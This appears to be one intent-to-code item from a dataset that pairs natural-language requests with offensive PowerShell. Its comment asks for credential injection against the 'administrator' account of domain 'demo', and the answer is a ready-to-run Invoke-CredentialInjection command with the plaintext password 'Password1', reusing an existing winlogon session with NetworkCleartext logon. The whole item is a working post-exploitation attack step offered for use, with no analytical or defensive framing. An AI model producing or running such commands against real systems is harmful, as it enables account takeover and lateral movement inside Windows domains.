# Natural language intent:
# Perform credential injection targeting the domain 'demo' and the 'administrator' account with an existing winlogon session using NetworkCleartext logon type.

Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -ExistingWinLogon -LogonType NetworkCleartext
